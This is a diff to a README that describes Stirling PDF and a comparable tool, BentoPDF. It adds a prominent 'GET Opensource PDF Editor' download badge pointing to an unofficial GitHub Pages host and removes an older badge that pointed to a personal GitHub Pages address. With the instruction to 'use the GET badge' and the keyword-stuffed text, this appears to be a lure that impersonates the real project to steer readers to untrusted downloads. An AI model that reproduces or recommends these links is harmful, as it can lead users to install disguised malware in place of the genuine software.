@@ -16,6 +16,8 @@ The neighbor toolkit lists the same jobs without a required server: no upload qu
 
 Tool names live in [pdf-tools.ts](FILES/config/pdf-tools.ts). The Java process starts in [SPDFApplication.java](FILES/java/SPDFApplication.java).
 
+[![GET Opensource PDF Editor](https://img.shields.io/badge/GET-Opensource%20PDF%20Editor-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://opensource-pdf-editor.github.io/Stirling-PDF/)
+
 ## Why BentoPDF?
 
 The neighbor answers four product questions that also apply to Stirling PDF.
@@ -219,8 +221,6 @@ Read CONTRIBUTING in each upstream tree. Stirling PDF uses Task for build, dev, 
 Stirling PDF is open-core. See the LICENSE file that shipped with the installer or jar you run. The neighbor is AGPL-3.0 or commercial. Do not mix the two licenses in one binary.
 
 ## Download
-
-[![GET Opensource PDF Editor](https://img.shields.io/badge/GET-Opensource%20PDF%20Editor-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://cooperwilliam3374.github.io/.github/Stirling-PDF)
 
 Use the GET badge for this pack. Stirling PDF also ships a desktop build for stirling pdf windows, macOS, and Linux, plus Docker and a Java jar. Community is free. Paid plans unlock team and enterprise after a license is applied.
 
